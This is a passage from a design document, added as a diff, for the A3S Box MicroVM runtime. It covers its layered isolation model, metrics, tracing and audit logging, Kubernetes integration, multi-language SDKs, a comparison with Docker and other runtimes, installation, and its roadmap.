+        -> Faces Layer 6 (Seccomp): dangerous syscalls blocked
+        -> Faces Layer 5 (Capabilities): lacks necessary capabilities
+
+Step 2: Assume attacker bypasses application-layer defenses, gains root
+        -> Faces Layer 4 (Namespace): can only see own processes and filesystem
+        -> Faces Layer 3 (Independent kernel): kernel vulnerabilities only affect own VM
+
+Step 3: Assume attacker exploits a kernel vulnerability
+        -> Faces Layer 1 (Hardware virtualization): VM Exit mechanism blocks cross-VM access
+        -> Cannot read MicroVM B's memory
+
+Step 4: Assume attacker even breaks through the virtualization layer (extremely rare)
+        -> Faces Layer 2 (TEE memory encryption): MicroVM B's memory is encrypted
+        -> Even if raw memory data is read, it's only ciphertext
+
+Conclusion: The attacker must simultaneously breach all seven layers to achieve the goal.
+            Each layer is independent; breaching one layer does not reduce other layers' defense strength.
+```
+
+---
+
+## 17. Observability: Prometheus, OpenTelemetry, and Auditing
+
+### 17.1 The Three Pillars of Observability
+
+Running a MicroVM cluster in production requires observability. A3S Box implements the three pillars of observability: Metrics, Tracing, and Auditing.
+
+### 17.2 Prometheus Metrics
+
+`RuntimeMetrics` implements the `MetricsCollector` trait, exposing the following metrics via the Prometheus client library:
+
+**VM lifecycle metrics:**
+
+| Metric Name | Type | Description |
+| ---------------------- | --------- | -------------------- |
+| `vm_boot_duration` | Histogram | VM startup duration distribution |
+| `vm_created_total` | Counter | Total VMs created |
+| `vm_destroyed_total` | Counter | Total VMs destroyed |
+| `vm_count` | Gauge | Current number of running VMs |
+
+**Command execution metrics:**
+
+| Metric Name | Type | Description |
+| --------------------- | --------- | ---------------- |
+| `exec_total` | Counter | Total commands executed |
+| `exec_duration` | Histogram | Command execution duration distribution |
+| `exec_errors_total` | Counter | Total execution errors |
+
+**VM-level metrics:**
+
+Each VM also exposes real-time resource usage metrics:
+
+```rust
+pub struct VmMetrics {
+    pub cpu_percent: Option<f32>,    // CPU usage
+    pub memory_bytes: Option<u64>,   // Memory usage
+}
+```
+
+These metrics are collected from the host's `/proc` filesystem via the `sysinfo` library, reflecting the actual resource consumption of the shim subprocess (i.e., the VM).
+
+### 17.3 OpenTelemetry Distributed Tracing
+
+A3S Box integrates the OpenTelemetry SDK to generate distributed tracing spans for key operations. This allows operators to trace the complete path of a request from CLI to runtime to shim to Guest Init.
+
+Typical trace chain:
+
+```
+[a3s-box run nginx]
+  +-- [runtime.create_vm]
+       +-- [oci.pull_image]
+       |    +-- [registry.authenticate]
+       |    +-- [registry.pull_manifest]
+       |    +-- [registry.pull_layers]
+       +-- [rootfs.build]
+       +-- [vm.start]
+       |    +-- [shim.spawn]
+       |    +-- [shim.wait_ready]
+       +-- [vm.configure_network]
+```
+
+Trace data can be exported to SigNoz, Jaeger, or any backend compatible with the OTLP protocol.
+
+### 17.4 Audit Log System
+
+Audit logs are a critical component of security compliance. A3S Box's audit system is based on the W7 model (Who, What, When, Where, Why, How, Outcome), recording all security-related operations.
+
+`AuditEvent` structure:
+
+```rust
+pub struct AuditEvent {
+    pub id: String,                          // Unique event ID
+    pub timestamp: DateTime<Utc>,            // Timestamp
+    pub action: AuditAction,                 // Operation type
+    pub box_id: Option<String>,              // Associated MicroVM ID
+    pub actor: Option<String>,               // Actor
+    pub outcome: AuditOutcome,               // Result
+    pub message: Option<String>,             // Description
+    pub metadata: HashMap<String, String>,   // Additional metadata
+}
+```
+
+### 17.5 Audit Operation Categories
+
+A3S Box defines 26 audit operations across seven categories:
+
+| Category | Operations | Description |
+| ------------ | ---------------------------------------------------------------------- | ------------------------------------------- |
+| Box lifecycle | Create, Start, Stop, Destroy, Restart | VM creation, start, stop, destroy, restart |
+| Execution | Command, Attach | Command execution, terminal attach |
+| Image | Pull, Push, Build, Delete | Image pull, push, build, delete |
+| Network | Create, Delete, Connect, Disconnect | Network create, delete, connect, disconnect |
+| Volume | Create, Delete | Volume create, delete |
+| Security | SignatureVerify, AttestationVerify, SecretInject, SealData, UnsealData | Signature verify, attestation verify, key inject, data seal/unseal |
+| Auth | RegistryLogin, Logout | Registry login, logout |
+| System | Prune, ConfigChange | Cleanup, config change |
+
+Each audit event's result (`AuditOutcome`) is one of three: `Success`, `Failure`, `Denied`.
+
+### 17.6 Audit Log Configuration
+
+```rust
+pub struct AuditConfig {
+    pub enabled: bool,       // Default true
+    pub max_size: u64,       // Maximum single file size, default 50 MB
+    pub max_files: u32,      // Maximum number of files, default 10
+}
+```
+
+Audit logs are written in JSON-lines format with log rotation support. When a single file reaches `max_size`, it automatically rotates, retaining at most `max_files` historical files. Total audit storage limit is `max_size x max_files` (default 500 MB).
+
+Users can query audit logs via CLI:
+
+```bash
+# View all audit events
+a3s-box audit
+
+# Filter by operation type
+a3s-box audit --filter "action=exec"
+
+# Filter by MicroVM
+a3s-box audit --filter "box_id=my-app"
+
+# Filter by time range
+a3s-box audit --since "2024-01-01T00:00:00Z"
+```
+
+### 17.7 Custom Audit Backend
+
+The `AuditSink` trait allows users to implement custom audit event persistence backends:
+
+```rust
+pub trait AuditSink: Send + Sync {
+    fn write(&self, event: &AuditEvent) -> Result<()>;
+    fn flush(&self) -> Result<()>;
+}
+```
+
+The default implementation writes events to JSON-lines files. Users can implement their own `AuditSink` to send events to Elasticsearch, Splunk, CloudWatch Logs, or any other log aggregation system.
+
+---
+
+## 18. Kubernetes Integration: CRI Runtime
+
+### 18.1 The Role of CRI
+
+CRI (Container Runtime Interface) is the standard interface defined by Kubernetes for communication between kubelet and container runtimes. By implementing CRI, A3S Box can run as a Kubernetes RuntimeClass — meaning Pods in a Kubernetes cluster can choose to run in A3S Box's MicroVMs rather than traditional runc containers.
+
+```
+kubelet
+  |
+  +-- RuntimeClass: runc (default)
+  |   +-- Traditional containers (shared kernel)
+  |
+  +-- RuntimeClass: a3s-box
+      +-- MicroVM (independent kernel + optional TEE)
+```
+
+### 18.2 BoxAutoscaler CRD
+
+A3S Box defines a custom resource `BoxAutoscaler` (API Group: `box.a3s.dev`, version: `v1alpha1`) for implementing MicroVM auto-scaling in Kubernetes:
+
+```yaml
+apiVersion: box.a3s.dev/v1alpha1
+kind: BoxAutoscaler
+metadata:
+  name: my-service-autoscaler
+spec:
+  targetRef:
+    apiVersion: box.a3s.dev/v1alpha1
+    kind: BoxDeployment
+    name: my-service
+  minReplicas: 1
+  maxReplicas: 10
+  metrics:
+    - type: Cpu
+      target: 70          # CPU usage target 70%
+    - type: Memory
+      target: 80          # Memory usage target 80%
+    - type: Rps
+      target: 1000        # Requests per second target
+    - type: Inflight
+      target: 50          # Concurrent requests target
+  behavior:
+    scaleUp:
+      stabilizationWindowSeconds: 60
+      policies:
+        - type: Pods
+          value: 3
+          periodSeconds: 60    # Scale up at most 3 per minute
+    scaleDown:
+      stabilizationWindowSeconds: 300
+      policies:
+        - type: Pods
+          value: 1
+          periodSeconds: 60    # Scale down at most 1 per minute
+  cooldownSecs: 60
+```
+
+### 18.3 Metric Types
+
+BoxAutoscaler supports five metric types:
+
+| Metric Type | Description | Typical Target |
+| ------------ | ----------------------------- | ---------- |
+| `Cpu` | CPU usage percentage | 70% |
+| `Memory` | Memory usage percentage | 80% |
+| `Inflight` | Current concurrent requests | 50 |
+| `Rps` | Requests per second | 1000 |
+| `Custom` | Custom metrics (Prometheus query) | Scenario-dependent |
+
+### 18.4 Instance Lifecycle
+
+In Kubernetes integration, each MicroVM instance goes through the following state transitions:
+
+```
+Creating -> Booting -> Ready -> Busy -> Draining -> Stopping -> Stopped
+                        ^       |
+                        +-------+
+                                         v (abnormal)
+                                       Failed
+```
+
+State meanings:
+
+- **Creating**: Instance configuration generated, resources being allocated
+- **Booting**: MicroVM starting (kernel boot, Guest Init initialization)
+- **Ready**: Instance ready, can receive traffic
+- **Busy**: Instance processing a request
+- **Draining**: Instance draining existing requests (graceful transition before scale-down)
+- **Stopping**: Instance shutting down
+- **Stopped**: Instance stopped
+- **Failed**: Instance terminated abnormally
+
+### 18.5 Scale API
+
+`ScaleRequest` and `ScaleResponse` define the request/response protocol for scaling:
+
+```rust
+pub struct ScaleRequest {
+    pub service: String,
+    pub replicas: u32,
+    pub config: ScaleConfig,    // image, vcpus, memory_mib, env, port_map
+    pub request_id: String,
+}
+
+pub struct ScaleResponse {
+    pub request_id: String,
+    pub accepted: bool,
+    pub current_replicas: u32,
+    pub target_replicas: u32,
+    pub instances: Vec<InstanceInfo>,
+    pub error: Option<String>,
+}
+```
+
+### 18.6 Instance Health Checks
+
+Each instance continuously reports health status:
+
+```rust
+pub struct InstanceHealth {
+    pub cpu_percent: f32,
+    pub memory_bytes: u64,
+    pub inflight_requests: u32,
+    pub healthy: bool,
+}
+```
+
+Health check data is used simultaneously for:
+
+- BoxAutoscaler scaling decisions
+- Load balancer traffic distribution
+- Alert system anomaly detection
+
+### 18.7 Gateway Self-Registration
+
+After a MicroVM instance starts, it self-registers with A3S Gateway via `InstanceRegistration`:
+
+```rust
+pub struct InstanceRegistration {
+    pub instance_id: String,
+    pub service: String,
+    pub endpoint: String,       // Instance access address
+    pub health: InstanceHealth,
+    pub metadata: HashMap<String, String>,
+}
+```
+
+When an instance stops, it sends `InstanceDeregistration` to cancel registration. This self-registration mechanism allows the Gateway to automatically discover and route to new instances without manual configuration.
+
+---
+
+## 19. SDK Ecosystem: Unified Rust, Python, and TypeScript
+
+### 19.1 SDK Architecture
+
+A3S Box's SDK uses a "implement once, bind to multiple languages" architecture:
+
+```
++-----------------------------------------+
+|              a3s-box-sdk (Rust)          |
+|         Core: BoxSdk + BoxSandbox        |
++----------+------------+------------------+
+|  Rust    |   Python   |  TypeScript      |
+|  Native  |  PyO3      |  napi-rs         |
+|  API     |  bindings  |  bindings        |
+|          |  (async)   |  (async)         |
++----------+------------+------------------+
+```
+
+Core logic is implemented once in Rust, then native bindings are generated via PyO3 (Python) and napi-rs (TypeScript/Node.js). This ensures the behavior of all three SDKs is completely consistent, while enjoying Rust's performance and safety.
+
+### 19.2 Rust SDK
+
+The Rust SDK is the lowest-level interface, providing complete type safety and zero-cost abstractions:
+
+```rust
+use a3s_box_sdk::{BoxSdk, SandboxOptions};
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    // Create SDK instance
+    let sdk = BoxSdk::new(None)?;  // None = use default home_dir
+
+    // Create sandbox
+    let sandbox = sdk.create(Some(SandboxOptions {
+        image: "python:3.11".to_string(),
+        vcpus: 2,
+        memory_mib: 1024,
+        ..Default::default()
+    })).await?;
+
+    // Execute command
+    let output = sandbox.exec(&["python", "-c", "print('hello')"]).await?;
+    println!("{}", output.stdout);
+
+    // Sandbox is automatically cleaned up on drop
+    Ok(())
+}
+```
+
+### 19.3 Python SDK
+
+The Python SDK bridges via PyO3, providing a Pythonic async interface:
+
+```python
+import asyncio
+from a3s_box import BoxSdk, SandboxOptions
+
+async def main():
+    # Create SDK instance
+    sdk = BoxSdk()
+
+    # Create sandbox
+    sandbox = sdk.create(SandboxOptions(
+        image="python:3.11",
+        vcpus=2,
+        memory_mib=1024,
+    ))
+
+    # Execute command
+    output = sandbox.exec(["python", "-c", "print('hello')"])
+    print(output.stdout)
+
+asyncio.run(main())
+```
+
+Key design decisions for PyO3 bindings:
+
+- Use `py.allow_threads` to release the GIL, ensuring Rust's async operations don't block Python's event loop
+- Maintain an internal Tokio Runtime to bridge Python's synchronous calls to Rust's async world
+- Type mapping: Rust's `Result<T>` -> Python exceptions, Rust's `Option<T>` -> Python's `None`
+
+### 19.4 TypeScript SDK
+
+The TypeScript SDK generates native Node.js modules via napi-rs:
+
+```typescript
+import { BoxSdk, SandboxOptions } from '@a3s/box';
+
+async function main() {
+    // Create SDK instance
+    const sdk = new BoxSdk();
+
+    // Create sandbox
+    const sandbox = await sdk.create({
+        image: 'node:20',
+        vcpus: 2,
+        memoryMib: 1024,
+    });
+
+    // Execute command
+    const output = await sandbox.exec(['node', '-e', 'console.log("hello")']);
+    console.log(output.stdout);
+}
+
+main();
+```
+
+The advantage of napi-rs is that it generates a true native module (`.node` file), not via FFI or subprocess calls. This means:
+
+- Zero serialization overhead (data passed directly between V8 heap and Rust heap)
+- Complete TypeScript type definitions (auto-generated `.d.ts`)
+- Supports async/await (via Tokio and libuv integration)
+
+### 19.5 Multi-Platform Builds
+
+SDK native bindings need to be compiled separately for each target platform. A3S Box implements multi-platform builds via GitHub Actions CI matrix:
+
+| Platform | Python wheels | Node.js modules |
+| ----------------------------- | ------------- | ------------ |
+| Linux x86_64 | maturin | napi-rs |
+| Linux aarch64 | maturin | napi-rs |
+| macOS x86_64 | maturin | napi-rs |
+| macOS aarch64 (Apple Silicon) | maturin | napi-rs |
+
+Python wheels are built via `maturin` and published to PyPI; Node.js modules are built via `napi-rs` and published to npm. Users only need `pip install a3s-box` or `npm install @a3s/box`, and the package manager automatically selects the correct platform variant.
+
+---
+
+## 20. Comparative Analysis with Existing Solutions
+
+### 20.1 Container Runtime Landscape
+
+The current container runtime ecosystem can be divided into four levels by isolation strength:
+
+```
+Isolation strength ^
+                   |
+                   |  +------------------------------------------+
+                   |  | A3S Box (TEE mode)                        |
+                   |  | MicroVM + memory encryption + 7-layer defense |
+                   |  +------------------------------------------+
+                   |  +------------------------------------------+
+                   |  | A3S Box (standard mode) / Kata Containers  |
+                   |  | MicroVM + independent kernel               |
+                   |  +------------------------------------------+
+                   |  +------------------------------------------+
+                   |  | gVisor                                     |
+                   |  | Userspace kernel (syscall interception)    |
+                   |  +------------------------------------------+
+                   |  +------------------------------------------+
+                   |  | runc (Docker default)                      |
+                   |  | Shared kernel + namespace + cgroup         |
+                   |  +------------------------------------------+
+                   |
+                   +-------------------------------------------> Performance overhead
+```
+
+### 20.2 Detailed Comparison
+
+| Dimension | runc (Docker) | gVisor | Kata Containers | Firecracker | A3S Box |
+| ------------------------- | --------------------------- | ------------------- | -------------------------- | -------------------- | ----------------------- |
+| **Isolation mechanism** | namespace + cgroup | Userspace kernel | MicroVM (QEMU/CLH) | MicroVM (KVM) | MicroVM (libkrun) |
+| **Kernel isolation** | Shared | Partial (Sentry) | Independent | Independent | Independent |
+| **Cold start** | ~50ms | ~150ms | ~500ms-2s | ~125ms | ~200ms |
+| **Memory overhead** | ~5 MB | ~15 MB | ~30-50 MB | ~5 MB | ~10 MB |
+| **TEE support** | No | No | Limited | No | Yes (SEV-SNP, TDX planned) |
+| **macOS support** | Yes (Docker Desktop) | No | No | No | Yes (native HVF) |
+| **Docker CLI compat** | Native | Partial | Via shimv2 | No | Yes (52 commands) |
+| **K8s integration** | CRI | CRI | CRI | containerd-shim | CRI |
+| **Language** | Go | Go | Go + Rust | Rust | Rust |
+| **Embedded SDK** | No | No | No | Yes (Rust) | Yes (Rust/Python/TS) |
+| **Audit logs** | No | No | No | No | Yes (26 operations) |
+| **Warm pool** | N/A | N/A | No | No | Yes (auto-scaling) |
+| **RA-TLS** | No | No | No | No | Yes |
+| **Sealed storage** | No | No | No | No | Yes (3 policies) |
+| **Daemon required** | Yes (dockerd) | Yes (runsc) | Yes (shimv2) | Yes (firecracker) | No daemon |
+| **Binary size** | ~200 MB (full) | ~50 MB | ~100 MB+ | ~30 MB | ~40 MB (single binary) |
+| **Dependencies** | dockerd + containerd + runc | containerd + runsc | containerd + shimv2 + QEMU | firecracker + jailer | Single binary, zero external deps |
+
+### 20.3 A3S Box vs Docker: Deep Comparison
+
+Docker is the de facto standard of the container ecosystem and the tool most developers are familiar with. A deep comparison of A3S Box with Docker helps understand A3S Box's differentiated value.
+
+#### 20.3.1 Architecture Difference: Daemonless vs Daemon Model
+
+Docker uses a classic client-server architecture:
+
+```
+Docker architecture:
+  docker CLI --> dockerd (daemon, always running in background)
+                    |
+                    +-- containerd (container lifecycle management)
+                    |       |
+                    |       +-- containerd-shim
+                    |               |
+                    |               +-- runc (OCI runtime)
+                    |                     |
+                    |                     +-- container process
+                    |
+                    +-- network/storage/logging plugins
+```
+
+This architecture means:
+
+- Must run `dockerd` daemon (typically with root privileges)
+- `dockerd` is a single point of failure — if the daemon crashes, management capability for all containers is lost
+- The daemon itself is a high-value attack target (root privileges + controls all containers)
+- Upgrading Docker requires restarting the daemon, potentially affecting running containers
+
+A3S Box uses a daemonless architecture:
+
+```
+A3S Box architecture:
+  a3s-box CLI --> directly starts shim subprocess
+                        |
+                        +-- libkrun (library call, not separate process)
+                                |
+                                +-- MicroVM (independent kernel)
+                                        |
+                                        +-- Guest Init (PID 1)
+                                                |
+                                                +-- application process
+```
+
+Advantages of daemonless:
+
+- **No single point of failure**: Each MicroVM is managed by an independent shim subprocess; one VM's management process crashing doesn't affect other VMs
+- **No privileged daemon**: Eliminates the Docker daemon as a high-value attack target
+- **Zero operational overhead**: No need to manage daemon startup, monitoring, log rotation
+- **Ready to use**: No `systemctl start docker` needed; just execute the command directly
+
+#### 20.3.2 Size Comparison: 40MB vs 200MB+
+
+| Component | Docker | A3S Box |
+| -------------- | -------------------- | ------------------------------ |
+| CLI | docker (~50 MB) | a3s-box (~40 MB, includes all features) |
+| Runtime daemon | dockerd (~80 MB) | Not needed |
+| Container management | containerd (~50 MB) | Built-in |
+| OCI runtime | runc (~10 MB) | Built-in (libkrun) |
+| Network plugins | CNI plugins (~20 MB) | Built-in |
+| **Total** | **~200 MB+** | **~40 MB** |
+
+A3S Box compiles all functionality into a single Rust binary with no external dependencies. This means:
+
+- **Minimal deployment**: Copy one file to complete installation, no package manager needed
+- **Simple version management**: One binary = one version, no component version incompatibility issues
+- **Offline deployment friendly**: In environments without network, only need to transfer a 40MB file
+- **CI/CD cache efficient**: Caching one file is much faster than caching an entire Docker installation
+
+#### 20.3.3 Security Model Comparison
+
+```
+Docker's isolation boundary:
++-------------------------------------+
+|       Host Linux Kernel              |  <- All containers share this
+|  +---------+  +---------+           |
+|  | Cont. A  |  | Cont. B  |          |
+|  | ns+cgroup|  | ns+cgroup|          |
+|  +---------+  +---------+           |
+|                                     |
+|  Kernel vulnerability = all containers compromised  |
++-------------------------------------+
+
+A3S Box's isolation boundary:
++-------------------------------------+
+|       Host Linux Kernel              |
+|  +--------------+  +--------------+ |
+|  | MicroVM A     |  | MicroVM B     | |
+|  | +----------+ |  | +----------+ | |
+|  | |Indep.    | |  | |Indep.    | | |
+|  | |kernel    | |  | |kernel    | | |
+|  | |app proc  | |  | |app proc  | | |
+|  | +----------+ |  | +----------+ | |
+|  | HW virt boundary|  | HW virt boundary| |
+|  +--------------+  +--------------+ |
+|                                     |
+|  VM A kernel vuln != VM B affected  |
++-------------------------------------+
+```
+
+Key security differences:
+
+| Security Dimension | Docker | A3S Box |
+| ----------------- | ---------------------------- | ------------------------------- |
+| Kernel sharing | All containers share host kernel | Each VM has independent kernel |
+| Escape impact | One container escape -> control all containers | One VM escape -> only affects that VM |
+| Privileged daemon | dockerd runs as root | No daemon |
+| Memory encryption | No | Yes (TEE, SEV-SNP) |
+| Remote attestation | No | Yes (RA-TLS) |
+| Audit logs | Basic (Docker events) | Complete (26 operations, W7 model) |
+| Default Seccomp | Allows ~300 syscalls | Blocks 16 dangerous calls + arch validation |
+| Default Capabilities | Retains 14 | All stripped |
+
+#### 20.3.4 Startup Speed Comparison
+
+```
+Docker container startup (~50ms):
+  [0ms]  dockerd receives request
+  [5ms]  containerd creates container
+  [10ms] runc sets up namespace + cgroup
+  [20ms] pivot_root switches root filesystem
+  [30ms] application process starts
+  [50ms] ready
+
+A3S Box MicroVM startup (~200ms):
+  [0ms]   CLI receives request
+  [20ms]  start shim subprocess
+  [50ms]  libkrun creates VM + kernel boot
+  [150ms] Guest Init mounts filesystems
+  [180ms] configure network + start vsock servers
+  [200ms] ready
+
+A3S Box warm pool mode (~0ms):
+  [0ms]   CLI receives request
+  [0ms]   acquire ready VM from warm pool
+  [0ms]   ready
+```
+
+Docker's startup speed is indeed faster (~50ms vs ~200ms), but the 150ms difference buys:
+
+- Upgrade from shared-kernel isolation to hardware virtualization isolation
+- Optional TEE memory encryption
+- Independent kernel (kernel vulnerabilities don't spread)
+
+For latency-sensitive scenarios, the warm pool mechanism can reduce effective startup time to near zero.
+
+#### 20.3.5 Developer Experience Comparison
+
+| Dimension | Docker | A3S Box |
+| ---------- | ------------------------------------------------------------- | ------------------------------- |
+| Installation | Need to install Docker Desktop (macOS/Windows) or docker-ce (Linux) | Download single binary, no installation needed |
+| macOS support | Via Docker Desktop (requires HyperKit/VZ virtualization layer) | Native Apple HVF, no intermediate layer |
+| Command compat | Native | 52 compatible commands, consistent syntax |
+| Dockerfile | Native support | Compatible with OCI image format |
+| SDK embedding | Via Docker API (HTTP REST) | Native Rust/Python/TypeScript SDK |
+| Resource usage | Docker Desktop resident memory ~1-2 GB | No resident process, start on demand |
+| License | Docker Desktop requires payment for commercial use | MIT open source |
+
+For developers, the cost of migrating from Docker to A3S Box is minimal:
+
+```bash
+# Before migration
+docker run -d --name web -p 8080:80 nginx
+docker exec web curl localhost
+docker logs web
+docker stop web && docker rm web
+
+# After migration (just replace the command name)
+a3s-box run -d --name web -p 8080:80 nginx
+a3s-box exec web curl localhost
+a3s-box logs web
+a3s-box stop web && a3s-box rm web
+```
+
+#### 20.3.6 Installation Method Comparison
+
+Docker installation varies by platform and typically requires multiple steps:
+
+```bash
+# Docker on macOS -- requires downloading ~1GB Docker Desktop installer
+# 1. Download Docker Desktop .dmg
+# 2. Drag to install
+# 3. Start Docker Desktop (resident in background, uses 1-2 GB memory)
+# 4. Wait for dockerd to finish starting
+
+# Docker on Linux -- requires configuring apt/yum repository
+curl -fsSL https://get.docker.com | sh
+sudo systemctl enable --now docker
+sudo usermod -aG docker $USER
+# Need to re-login to shell for changes to take effect
+```
+
+A3S Box provides multiple lightweight installation methods, each completing in seconds:
+
+```bash
+# Method 1: Homebrew (macOS / Linux)
+brew tap A3S-Lab/homebrew-tap https://github.com/A3S-Lab/homebrew-tap.git
+brew install a3s-box
+# Automatically downloads pre-compiled binary from GitHub Releases
+# Includes a3s-box CLI + a3s-box-shim + a3s-box-guest-init
+# Done. No daemon, no restart needed, immediately usable.
+
+# Method 2: Cargo (Rust developers)
+cargo install a3s-box
+# Compile and install from source, automatically gets latest version
+
+# Method 3: Helm (Kubernetes cluster)
+helm repo add a3s https://a3s-lab.github.io/charts
+helm install a3s-box a3s/a3s-box
+# Deploy as DaemonSet in K8s cluster, automatically runs on each node
+
+# Method 4: Direct binary download (GitHub Releases)
+# macOS Apple Silicon:
+curl -L https://github.com/A3S-Lab/Box/releases/latest/download/a3s-box-latest-macos-arm64.tar.gz | tar xz
+# Linux x86_64:
+curl -L https://github.com/A3S-Lab/Box/releases/latest/download/a3s-box-latest-linux-x86_64.tar.gz | tar xz
+./a3s-box version
+# Extract and use, zero dependencies
+```
+
+| Installation Method | Use Case | Install Time | Dependencies |
+| -------- | ------------------------- | -------- | -------------- |
+| Homebrew | macOS/Linux daily development | ~10 seconds | Homebrew |
+| Cargo | Rust developers, source compilation | ~2 minutes | Rust toolchain |
+| Helm | Kubernetes cluster deployment | ~30 seconds | Helm + K8s |
+| Direct download | CI/CD, offline environments, edge devices | ~5 seconds | None |
+
+For more installation details and configuration options, see the official documentation: [https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/)
+
+Compared to Docker Desktop's installation experience (download 1GB -> install -> start daemon -> wait for ready), A3S Box's installation can be summarized in one word: **instant**.
+
+#### 20.3.7 When to Choose Docker, When to Choose A3S Box?
+
+**Choose Docker when:**
+
+- Extremely latency-sensitive (P99 < 100ms) and not using warm pool
+- Deep integration with Docker API toolchain with high migration cost
+- Hardware-level isolation not needed (e.g., internal development environments, trusted workloads)
+- Need Docker Compose to orchestrate multi-container applications
+
+**Choose A3S Box when:**
+
+- Running untrusted code (AI Agents, user-submitted code, third-party plugins)
+- Multi-tenant environments requiring strong isolation guarantees
+- Processing sensitive data requiring TEE confidential computing
+- Need complete audit trail (compliance requirements)
+- macOS development environment without wanting to install Docker Desktop
+- Edge/IoT deployment requiring minimal binary size
+- Need to embed sandbox capability into applications (SDK integration)
+
+### 20.4 Scenario Applicability Analysis
+
+**Scenario 1: Development and Testing Environments**
+
+Recommended: A3S Box (TSI mode) or Docker
+
+A3S Box provides native support on macOS via Apple HVF; developers don't need to install Docker Desktop. 52 compatible commands make migration cost nearly zero. TSI network mode requires zero configuration, suitable for rapid iteration.
+
+**Scenario 2: Multi-Tenant SaaS Platforms**
+
+Recommended: A3S Box (Bridge mode + TEE)
+
+Multi-tenant scenarios require strong isolation guarantees. A3S Box's hardware virtualization + TEE memory encryption provides the highest level of tenant isolation. Network policies support traffic isolation between tenants. Audit logs meet compliance requirements.
+
+**Scenario 3: AI Agent Sandbox Execution**
+
+Recommended: A3S Box (warm pool + SDK)
+
+AI Agents need to execute untrusted code in isolated environments. A3S Box's SDK provides a unified programming interface for Rust/Python/TypeScript, and the warm pool mechanism eliminates cold start latency. The seven-layer security model ensures that even if Agent-generated code is malicious, it cannot escape the sandbox.
+
+**Scenario 4: Confidential Data Processing**
+
+Recommended: A3S Box (TEE mode + sealed storage)
+
+When processing medical records, financial data, or personal privacy information, TEE mode ensures data remains encrypted throughout processing. RA-TLS provides end-to-end attestation and encrypted communication. Sealed storage ensures persisted data can only be decrypted in trusted environments.
+
+**Scenario 5: High-Performance Computing / Low-Latency Services**
+
+Recommended: runc (Docker) or gVisor
+
+If security isolation is not the primary requirement and latency is extremely sensitive (P99 < 10ms), traditional containers' ~50ms startup time and lower runtime overhead may be more appropriate.
+
+### 20.5 A3S Box's Unique Positioning
+
+From the comparison, A3S Box's unique positioning is:
+
+1. **The only solution supporting both MicroVM isolation and TEE confidential computing**: Kata Containers has limited TEE support, but not as complete as A3S Box (lacking RA-TLS, sealed storage, re-attestation)
+2. **The only MicroVM solution with native macOS support**: Through libkrun + Apple HVF, developers can get an experience on Mac consistent with Linux production environments
+3. **The only MicroVM solution providing three-language SDKs**: Rust/Python/TypeScript SDKs allow A3S Box to be embedded into applications as a library, not just a command-line tool
+4. **The only MicroVM solution with a built-in complete audit system**: 26 audit operations, W7 model, pluggable backend
+
+---
+
+## 21. Future Outlook and Summary
+
+### 21.1 Technical Evolution Roadmap
+
+A3S Box's technical evolution revolves around three directions:
+
+**Direction 1: Expand TEE Hardware Support**
+
+A3S Box currently fully supports AMD SEV-SNP. Intel TDX (Trust Domain Extensions) support has been reserved in the architecture (the `TeeConfig::Tdx` variant is already defined) and will be implemented when Intel server platforms are more widely deployed. Future attention will also be paid to emerging confidential computing standards like ARM CCA (Confidential Compute Architecture).
+
+**Direction 2: Enhanced Network Policy Enforcement**
+
+The current network policies (`IsolationMode::Strict` and `Custom`) are fully defined in the data model, but runtime enforcement is not yet implemented. Future work will implement true network policy enforcement via iptables/nftables integration, supporting:
+
+- Fine-grained traffic control between MicroVMs
+- Label-based network segmentation
+- Port-level filtering of inbound/outbound traffic
+- Semantic alignment with Kubernetes NetworkPolicy
+
+**Direction 3: Deepening Security Capabilities**
+
+- **Custom Seccomp profiles**: Currently supports `Default` and `Unconfined` modes; future will support `Custom` mode, allowing users to provide custom Seccomp BPF profiles
+- **AppArmor / SELinux integration**: The CLI currently parses these options but doesn't enforce them; future will implement complete MAC (Mandatory Access Control) integration
+- **Image signature mandatory verification**: The signature verification framework is ready (`SignaturePolicy`, `VerifyResult`); future will integrate with the Sigstore/cosign ecosystem
+
+### 21.2 Ecosystem Expansion
+
+**OCI image building**: The `a3s-box build` command has been reserved via feature gate, and will support building OCI images inside MicroVMs — meaning the build process itself is protected by hardware isolation, preventing malicious Dockerfiles from attacking the host.
+
+**Kubernetes Operator maturation**: The current `BoxAutoscaler` CRD is at the `v1alpha1` stage and will progressively evolve to `v1beta1` and `v1`, adding more automated operations capabilities:
+
+- Rolling update strategies
+- Canary releases
+- Automatic failure recovery
+- Cross-availability-zone scheduling
+
+**Observability enhancements**:
+
+- More granular Prometheus metrics (network I/O, disk I/O, vsock latency)
+- Built-in Grafana dashboard templates
+- Real-time streaming of audit events (WebSocket / gRPC stream)
+
+### 21.3 Performance Optimization Directions
+
+**Startup time optimization**: Although 200ms cold start is already fast, there is still room for optimization:
+
+- Kernel trimming: Remove kernel modules not needed by MicroVMs, reducing kernel boot time
+- Snapshot restore: Save initialized VM snapshots, restore from snapshot rather than starting from scratch
+- Parallel initialization: Guest Init's steps execute in parallel where possible
+
+**Memory optimization**:
+
+- KSM (Kernel Same-page Merging): When multiple MicroVMs run the same image, share identical memory pages
+- Memory balloon: Dynamically adjust VM memory allocation, reclaim unused memory
+- Lazy memory allocation: Only allocate physical memory pages when the VM actually accesses them
+
+### 21.4 Summary
+
+A3S Box represents a paradigm shift in container runtimes. It doesn't patch existing container technology, but starts from the fundamental question "what is the essence of workload isolation" and arrives at a clear answer:
+
+**Every workload should run on its own operating system kernel, with hardware virtualization providing isolation guarantees, confidential computing providing data protection, while maintaining container-level startup speed and developer experience.**
+
+The realization of this answer depends on several key technical choices:
+
+- **libkrun as VMM**: Library-form embedding, native macOS/Linux dual-platform support, ~200ms cold start
+- **Rust as implementation language**: Memory safety, zero-cost abstractions, cross-platform compilation, PyO3/napi-rs ecosystem
+- **Minimal core + external extensions architecture**: 5 core components remain stable, 14 extension points can evolve independently
+- **Seven-layer defense in depth**: From hardware encryption to syscall filtering, each layer independently increases attack cost
+- **Docker-compatible user experience**: 52 commands, zero migration cost
+
+A3S Box's 1,466 tests (covering 218 source files) ensure the correct implementation of these technical choices. And its modular design — seven crates each with their own responsibilities, loosely coupled through Trait interfaces — ensures the system can continue to evolve without losing control.
+
+In the AI Agent era, a secure code execution environment is no longer optional but foundational infrastructure. A3S Box is the runtime built for this era — it runs every line of untrusted code in a hardware-isolated sandbox, protects every byte of sensitive data with hardware encryption, while making developers feel like they're using Docker.
+
+---
+
+> **A3S Box — Making security the default, not the option.**
+>
